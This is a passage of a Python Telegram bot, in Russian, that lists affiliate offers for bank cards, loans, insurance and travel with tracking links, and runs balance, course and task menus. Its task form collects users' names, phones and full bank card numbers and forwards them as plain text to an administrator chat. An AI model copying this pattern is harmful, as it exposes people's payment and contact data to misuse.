        "title": "Кредитная карта 60 дней без % – 8500₽",
        "link": "https://alfabank.ru/get-money/credit-cards/land/60-days-partners/?platformId=alfapartners_msv_CC-60_885537_3469224",
        "description": "Бесплатное обслуживание и кэшбэк",
        "category": "Банковские карты"
    },
    "card_11": {
        "title": "Детская карта – 3500₽",
        "link": "https://alfabank.ru/make-money/investments/brokerskij-schyot/?platformId=alfapartners_msv_DC-childcard_885537_3469164",
        "description": "Карта для ребёнка от 6 до 14 лет",
        "category": "Банковские карты"
    },
    "credit_1": {
        "title": "Альфа-Банк Кредит наличными 5000₽",
        "link": "https://alfabank.ru/get-money/credit/credit-cash/welcome/?platformId=alfapartners_msv_PIL-PIL_885537_4921952",
        "description": "Оформите кредит и получите 5000₽",
        "category": "Кредиты"
    },
    "credit_2": {
        "title": "Кредит на большие планы 2500₽",
        "link": "https://alfabank.ru/get-money/credit/credit-cash/form-online-pod-zalog/?platformId=alfapartners_msv_PIMB_885537_0",
        "description": "Оформите кредит и получите 2500₽",
        "category": "Кредиты"
    },
    "credit_3": {
        "title": "Ипотека 250 000₽",
        "link": "https://alfa.me/y-6Bns?url=https%3A%2F%2Fipoteka.alfabank.ru%2Fam",
        "description": "Оформите ипотеку и получите 250 000₽",
        "category": "Кредиты"
    },
    "credit_4": {
        "title": "Предодобренный кредит 25 000₽",
        "link": "https://alfa.me/0WwZ1h?url=https%3A%2F%2Fweb.alfabank.ru%2Fupsale-credits%2Fcredits%2FRP",
        "description": "Получите предодобренный кредит на 25 000₽",
        "category": "Кредиты"
    },
    "insur_1": {
        "title": "Zetta — спортсмены 1000₽",
        "link": "https://trk.ppdu.ru/click/Z07fQfwV?erid=2SDnje1GhqB",
        "description": "Оформите страховку и получите 1000₽",
        "category": "Страхование"
    },
    "insur_2": {
        "title": "Zetta школьники",
        "link": "https://trk.ppdu.ru/click/jKAsGV7v?erid=2SDnjdoXrY9",
        "description": "Оформите страховку для школьников",
        "category": "Страхование"
    },
    "insur_3": {
        "title": "Сберстрахование 2500₽",
        "link": "https://trk.ppdu.ru/click/uROD6qbL?erid=2SDnjeitzV5",
        "description": "Оформите страховку и получите 2500₽",
        "category": "Страхование"
    },
    "insur_4": {
        "title": "Т-Страхование ВЗР/Недвижимость",
        "link": "https://trk.ppdu.ru/click/88PEHkIJ?erid=2SDnjf1Gc5U",
        "description": "Оформите страховку ВЗР или недвижимости",
        "category": "Страхование"
    },
    "estate_1": {
        "title": "Яндекс.Аренда — 30 000₽",
        "link": "https://arenda.yandex.ru/referral/G1XEQDX490/promocode/",
        "description": "Сдайте или снимите жилье и получите 30 000₽",
        "category": "Недвижимость"
    },
    "tour_1": {
        "title": "AVIASALES — 5000₽",
        "link": "https://trk.ppdu.ru/click/HnqEhAGs?erid=2VtzqvwYBcc",
        "description": "Купите билеты и получите 5000₽",
        "category": "Туризм"
    },
    "tour_2": {
        "title": "Яндекс.Путешествия — 3000₽",
        "link": "https://trk.ppdu.ru/click/APUFJ8oK?erid=2SDnjezfxS3",
        "description": "Забронируйте и получите 3000₽",
        "category": "Туризм"
    },
    "tour_3": {
        "title": "KIWITAXI — 5000₽",
        "link": "https://trk.ppdu.ru/click/HdFuG4Xi?erid=2VtzqumW7vm",
        "description": "Закажите трансфер и получите 5000₽",
        "category": "Туризм"
    },
    "biz_1": {
        "title": "Регистрация бизнеса 25 000₽",
        "link": "https://alfabank.ru/sme/start/partner/ag/?platformId=alfapartners_msv_RKOregbiz_885537_3469325",
        "description": "Зарегистрируйте бизнес и получите 25 000₽",
        "category": "Бизнес"
    },
    "biz_2": {
        "title": "Расчётный счёт 2000₽",
        "link": "https://alfabank.ru/sme/partner/ag/?platformId=alfapartners_msv_rko-anketa_885537_3469333",
        "description": "Откройте расчетный счет и получите 2000₽",
        "category": "Бизнес"
    },
    "biz_3": {
        "title": "Интернет-эквайринг 15 000₽",
        "link": "https://alfabank.ru/sme/payservice/msv-intacq/?platformId=alfapartners_msv_intacq_885537_3469340",
        "description": "Подключите эквайринг и получите 15 000₽",
        "category": "Бизнес"
    },
    "broker_1": {
        "title": "Брокерский счёт – 12 500₽",
        "link": "https://alfabank.ru/make-money/investments/brokerskij-schyot/?platformId=alfapartners_msv_investment-ba_885537_3469359",
        "description": "Нужен для покупки и продажи акций, облигаций",
        "category": "Брокерские счета"
    },
    "sub_1": {
        "title": "Alfa Only Premium — 2500₽",
        "link": "https://alfabank.ru/everyday/package/premium/?platformId=alfapartners_msv_DC-premium_885537_3469276",
        "description": "Оформите подписку и получите 2500₽",
        "category": "Подписки"
    },
    "sim_1": {
        "title": "Альфа-Мобайл — 500₽",
        "link": "https://alfa.me/SIM_alfapartners_msv?prefilledDataID=alfapartnersmsv_885537",
        "description": "Оформите SIM-карту и получите 500₽",
        "category": "SIM-карты"
    }
}

# ====================== ОБРАБОТКА МЕНЮ ======================
async def handle_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    
    if text == "🏆 Задания":
        await show_tasks(update.message)
    elif text == "💼 Работа":
        await show_jobs(update.message)
    elif text == "💳 Банковские карты":
        await show_cards(update.message)
    elif text == "💰 Кредиты":
        await show_credits(update.message)
    elif text == "🛡 Страхование":
        await show_insurance(update.message)
    elif text == "🏠 Недвижимость":
        await show_real_estate(update.message)
    elif text == "✈️ Туризм и путешествия":
        await show_tourism(update.message)
    elif text == "🏢 Бизнес":
        await show_business(update.message)
    elif text == "📊 Брокерские счета":
        await show_brokerage(update.message)
    elif text == "🌟 Подписки":
        await show_subscriptions(update.message)
    elif text == "📱 SIM-карты":
        await show_sim_cards(update.message)
    elif text == "🎓 Курсы":
        await courses_menu(update, context)
    elif text == "💰 Баланс":
        await balance_menu(update, context)
    elif text == "🎁 Ежедневный бонус":
        await daily_bonus(update, context)
    elif text == "👤 Профиль":
        await profile_menu(update, context)
    elif text == "📞 Связь с админом":
        await update.message.reply_text(
            f"📞 Связь с администратором:\n\n"
            f"Telegram: {ADMIN_USERNAME}\n\n"
            "Напишите админу для решения вопросов.",
            reply_markup=main_menu_keyboard()
        )

async def show_tasks(message):
    keyboard = [
        [InlineKeyboardButton("Лендинг с заданиями", callback_data="task_1")],
        [InlineKeyboardButton("Яндекс.Браузер ПК", callback_data="task_2")],
        [InlineKeyboardButton("Яндекс.Браузер смартфон", callback_data="task_3")],
        [InlineKeyboardButton("Яндекс.Поиск", callback_data="task_4")],
        [InlineKeyboardButton("Приложение с Алисой", callback_data="task_5")]
    ]
    await message.reply_text("🏆 Задания Яндекса:", reply_markup=InlineKeyboardMarkup(keyboard))

async def show_jobs(message):
    keyboard = [
        [InlineKeyboardButton("Яндекс.Курьер", callback_data="job_1")],
        [InlineKeyboardButton("Партнёр Альфа-Банк", callback_data="job_2")],
        [InlineKeyboardButton("Брокер Альфа-Банк", callback_data="job_3")]
    ]
    await message.reply_text("💼 Работа:", reply_markup=InlineKeyboardMarkup(keyboard))

async def show_cards(message):
    keyboard = [
        [InlineKeyboardButton("T-BANK Black 500₽", callback_data="card_1")],
        [InlineKeyboardButton("T-BANK Исламская 700₽", callback_data="card_2")],
        [InlineKeyboardButton("ALL Airlines 500₽", callback_data="card_3")],
        [InlineKeyboardButton("T-BANK Platinum 500₽", callback_data="card_4")],
        [InlineKeyboardButton("ПСБ Кешбэк 700₽", callback_data="card_5")],
        [InlineKeyboardButton("ВТБ Кредитная 2000₽", callback_data="card_6")],
        [InlineKeyboardButton("Плати по миру 5000₽", callback_data="card_7")],
        [InlineKeyboardButton("Альфа-Карта 4000₽", callback_data="card_8")],
        [InlineKeyboardButton("Семейный счёт 2500₽", callback_data="card_9")],
        [InlineKeyboardButton("60 дней без % 8500₽", callback_data="card_10")],
        [InlineKeyboardButton("Детская карта 3500₽", callback_data="card_11")]
    ]
    await message.reply_text("💳 Банковские карты:", reply_markup=InlineKeyboardMarkup(keyboard))

async def show_credits(message):
    keyboard = [
        [InlineKeyboardButton("Кредит наличными 5000₽", callback_data="credit_1")],
        [InlineKeyboardButton("Кредит на планы 2500₽", callback_data="credit_2")],
        [InlineKeyboardButton("Ипотека 250 000₽", callback_data="credit_3")],
        [InlineKeyboardButton("Предодобренный 25 000₽", callback_data="credit_4")]
    ]
    await message.reply_text("💰 Кредиты:", reply_markup=InlineKeyboardMarkup(keyboard))

async def show_insurance(message):
    keyboard = [
        [InlineKeyboardButton("Zetta спортсмены 1000₽", callback_data="insur_1")],
        [InlineKeyboardButton("Zetta школьники", callback_data="insur_2")],
        [InlineKeyboardButton("Сберстрахование 2500₽", callback_data="insur_3")],
        [InlineKeyboardButton("Т-Страхование", callback_data="insur_4")]
    ]
    await message.reply_text("🛡 Страхование:", reply_markup=InlineKeyboardMarkup(keyboard))

async def show_real_estate(message):
    keyboard = [
        [InlineKeyboardButton("Яндекс.Аренда 30 000₽", callback_data="estate_1")]
    ]
    await message.reply_text("🏠 Недвижимость:", reply_markup=InlineKeyboardMarkup(keyboard))

async def show_tourism(message):
    keyboard = [
        [InlineKeyboardButton("AVIASALES 5000₽", callback_data="tour_1")],
        [InlineKeyboardButton("Яндекс.Путешествия 3000₽", callback_data="tour_2")],
        [InlineKeyboardButton("KIWITAXI 5000₽", callback_data="tour_3")]
    ]
    await message.reply_text("✈️ Туризм:", reply_markup=InlineKeyboardMarkup(keyboard))

async def show_business(message):
    keyboard = [
        [InlineKeyboardButton("Регистрация бизнеса 25 000₽", callback_data="biz_1")],
        [InlineKeyboardButton("Расчётный счёт 2000₽", callback_data="biz_2")],
        [InlineKeyboardButton("Интернет-эквайринг 15 000₽", callback_data="biz_3")]
    ]
    await message.reply_text("🏢 Бизнес:", reply_markup=InlineKeyboardMarkup(keyboard))

async def show_brokerage(message):
    keyboard = [
        [InlineKeyboardButton("Брокерский счёт 12 500₽", callback_data="broker_1")]
    ]
    await message.reply_text("📊 Брокерские счета:", reply_markup=InlineKeyboardMarkup(keyboard))

async def show_subscriptions(message):
    keyboard = [
        [InlineKeyboardButton("Alfa Only Premium 2500₽", callback_data="sub_1")]
    ]
    await message.reply_text("🌟 Подписки:", reply_markup=InlineKeyboardMarkup(keyboard))

async def show_sim_cards(message):
    keyboard = [
        [InlineKeyboardButton("Альфа-Мобайл 500₽", callback_data="sim_1")]
    ]
    await message.reply_text("📱 SIM-карты:", reply_markup=InlineKeyboardMarkup(keyboard))

# ====================== ОБРАБОТКА КНОПОК ======================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    
    if not query:
        return
    
    await query.answer()
    
    user_id = query.from_user.id
    data = query.data
    
    if data == "main_menu":
        user = query.from_user
        balance = db.get(user.id, "balance", 0)
        
        await query.message.reply_text(
            f"👋 Добро пожаловать, {user.first_name}!\n"
            f"💰 Твой баланс: {balance}₽",
            reply_markup=main_menu_keyboard()
        )
        return
    
    if data == "balance_menu":
        user = query.from_user
        balance = db.get(user.id, "balance", 0)
        
        keyboard = [
            [InlineKeyboardButton("💳 Пополнить баланс", callback_data="deposit")],
            [InlineKeyboardButton("📊 История операций", callback_data="history")],
            [InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")]
        ]
        
        await query.edit_message_text(
            f"💰 **Твой баланс:** {balance}₽\n\n"
            "Выберите действие:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return
    
    if data == "history":
        update_obj = Update(update.update_id, callback_query=query)
        await history_menu(update_obj, context)
        return
    
    if data == "profile_menu":
        update_obj = Update(update.update_id, message=query.message)
        await profile_menu(update_obj, context)
        return
    
    if data == "referral_menu":
        update_obj = Update(update.update_id, message=query.message)
        await referral_menu(update_obj, context)
        return
    
    if data == "all_achievements":
        await all_achievements_menu(update, context)
        return
    
    if data == "copy_referral":
        user_id = query.from_user.id
        referral_code = get_referral_code(user_id)
        bot_info = await context.bot.get_me()
        referral_link = f"https://t.me/{bot_info.username}?start={referral_code}"
        await query.answer(f"Ссылка: {referral_link}", show_alert=True)
        return
    
    if data == "deposit":
        await deposit_menu(update, context)
        return
    
    if data.startswith("deposit_"):
        amount = int(data.split("_")[1])
        await query.edit_message_text(
            f"💳 **Пополнение на {amount}₽**\n\n"
            f"Для пополнения баланса напишите администратору:\n{ADMIN_USERNAME}\n\n"
            f"Укажите сумму: {amount}₽\n"
            f"Ваш ID: {user_id}\n\n"
            "После оплаты администратор зачислит средства на ваш баланс.",
            parse_mode='Markdown'
        )
        return
    
    if data.startswith("view_course_"):
        course_id = data.replace("view_course_", "")
        course = COURSES[course_id]
        
        keyboard = [
            [InlineKeyboardButton(f"🛒 Купить за {course['price']}₽", callback_data=f"buy_{course_id}")],
            [InlineKeyboardButton("◀️ Назад к курсам", callback_data="back_to_courses")]
        ]
        
        await query.edit_message_text(
            f"🎓 **{course['title']}**\n\n"
            f"💰 Цена: {course['price']}₽\n"
            f"📚 Описание: {course['description']}\n\n"
            "Выберите действие:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return
    
    if data == "back_to_courses":
        keyboard = []
        for course_id, course in COURSES.items():
            keyboard.append([
                InlineKeyboardButton(
                    f"{course['title']} - {course['price']}₽",
                    callback_data=f"view_course_{course_id}"
                )
            ])
        
        keyboard.append([InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")])
        
        await query.edit_message_text(
            "🎓 **Доступные курсы:**\n\n"
            "Выберите курс для покупки:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return
    
    if data.startswith("buy_"):
        course_id = data.replace("buy_", "")
        await buy_course(update, context, course_id)
        return
    
    if data == "fill_form":
        task_id = db.get(user_id, "current_task")
        if task_id:
            task_info = TASK_DATA.get(task_id)
            if task_info:
                db.set(user_id, "waiting_form", True)
                await query.message.reply_text(
                    f"📝 **{task_info['title']}**\n\n"
                    "Отправьте данные в формате:\n"
                    "Имя Фамилия Телефон Номер_карты @username\n\n"
                    "Пример:\nИван Иванов +79991234567 1234567812345678 @ivanov"
                )
        return
    
    if data in TASK_DATA:
        task_info = TASK_DATA[data]
        db.set(user_id, "current_task", data)
        
        keyboard = [
            [InlineKeyboardButton("🔗 Перейти по ссылке", url=task_info['link'])],
            [InlineKeyboardButton("✅ Выполнил задание", callback_data="fill_form")]
        ]
        
        await query.message.reply_text(
            f"**{task_info['title']}**\n\n{task_info['description']}",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

# ====================== ОБРАБОТКА СООБЩЕНИЙ ======================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return
    
    user_id = update.effective_user.id
    
    if db.get(user_id, "waiting_form", False):
        user_message = update.message.text.strip()
        parts = user_message.split()
        
        if len(parts) < 5:
            await update.message.reply_text("❌ Неверный формат! Нужно: Имя Фамилия Телефон Номер_карты @username")
            return
        
        name = parts[0]
        surname = parts[1]
        phone = parts[2]
        card_number = parts[3]
        username = parts[4] if parts[4].startswith('@') else '@' + parts[4]
        
        task_id = db.get(user_id, "current_task", "unknown")
        task_info = TASK_DATA.get(task_id, {"title": "Неизвестно"})
        
        admin_msg = (
            f"📋 НОВАЯ ЗАЯВКА\n\n"
            f"👤 От: @{update.effective_user.username}\n"
            f"📛 Имя: {name} {surname}\n"
            f"📱 Телефон: {phone}\n"
            f"💳 Карта: {card_number}\n"
            f"🔗 Username: {username}\n"
            f"🎯 Задание: {task_info['title']}\n"
            f"🆔 ID пользователя: {user_id}"
        )
        
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
            logger.info(f"✅ Данные отправлены админу от {user_id}")
        except Exception as e:
            logger.error(f"Ошибка отправки сообщения админу: {e}")
            await update.message.reply_text("❌ Ошибка отправки. Попробуйте позже.")
            return
        
        task_id = db.get(user_id, "current_task")
        if task_id:
            completed_tasks = db.get_list(user_id, "completed_tasks")
            if task_id not in completed_tasks:
                db.append(user_id, "completed_tasks", task_id)
                
                new_achievements = check_achievements(user_id)
                if new_achievements:
                    achievements_text = "\n\n🎉 **Новые достижения:**\n"
                    for ach in new_achievements:
                        achievements_text += f"✅ {ach}\n"
                else:
                    achievements_text = ""
            else:
                achievements_text = ""
        else:
            achievements_text = ""
        
        await update.message.reply_text(
            "✅ Спасибо! Данные отправлены администратору.\n\n"
            f"Ожидайте выплаты. Вопросы: {ADMIN_USERNAME}" + achievements_text,
            reply_markup=main_menu_keyboard(),
            parse_mode='Markdown'
        )
        
        db.set(user_id, "waiting_form", False)
        return
    
    await handle_main_menu(update, context)

# ====================== ОБРАБОТКА ОШИБОК ======================
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Обработка ошибок для стабильной работы"""
    logger.error(f"Exception while handling an update: {context.error}")
    
    if isinstance(context.error, Exception):
        logger.error(f"Error details: {context.error}", exc_info=context.error)
    
    return True

# ====================== ЗАПУСК ======================
def main():
    print("=" * 60)
    print("🚀 БОТ ЗАПУСКАЕТСЯ НА KOYEB")
    print("=" * 60)
    
    try:
        application = Application.builder().token(TOKEN).build()
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("balance", balance_menu))
        application.add_handler(CommandHandler("courses", courses_menu))
        application.add_handler(CommandHandler("addbalance", add_balance))
        application.add_handler(CallbackQueryHandler(button_callback))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        application.add_error_handler(error_handler)
        
        print("✅ Бот инициализирован")
        print("📡 Запускаю polling...")
        
        application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )
        
        print("🤖 Бот готов к работе!")
        print("=" * 60)
        print(f"📊 Заданий: {len(TASK_DATA)}")
        print(f"🎓 Курсов: {len(COURSES)}")
        print(f"👤 Админ: {ADMIN_USERNAME}")
        print(f"💳 Баланс система: ✅ Активна")
        print("=" * 60)
    
    except Exception as e:
        print(f"❌ ОШИБКА: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
